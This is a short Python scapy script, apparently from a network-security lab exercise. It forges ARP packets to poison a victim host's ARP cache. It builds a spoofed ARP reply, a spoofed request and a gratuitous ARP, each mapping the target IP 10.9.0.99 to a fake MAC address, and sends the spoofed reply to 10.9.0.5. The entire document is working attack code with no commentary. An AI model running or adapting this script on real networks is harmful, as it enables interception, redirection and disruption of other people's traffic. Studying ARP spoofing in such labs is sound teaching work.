#!/usr/bin/env python3
from scapy.all import *

IP_V       = "10.9.0.5"
MAC_V_real = "02:42:0a:09:00:05"

IP_T       = "10.9.0.99"
MAC_T_fake = "aa:bb:cc:dd:ee:ff"

# Constructing ARP Reply packet
ether1  = Ether(src = MAC_T_fake, dst = MAC_V_real)
arp1    = ARP(psrc = IP_T, hwsrc = MAC_T_fake, 
             pdst = IP_V, hwdst = MAC_V_real)
arp1.op = 2   # Reply
frame1  = ether1/arp1


# Constructing ARP Request packet
ether2  = Ether(src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff")
arp2    = ARP(psrc = IP_T, hwsrc = MAC_T_fake, pdst = IP_V)
arp2.op = 1   # Request
frame2 = ether2/arp2


# Constructing Gratuitous ARP packet
ether3  = Ether(src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff")
arp3    = ARP(psrc  = IP_T, hwsrc = MAC_T_fake,
              pdst  = IP_T, hwdst = "ff:ff:ff:ff:ff:ff")
arp3.op = 2   # Reply
frame3 = ether3/arp3

# Send out the Spoofed ARP packet
sendp(frame1)
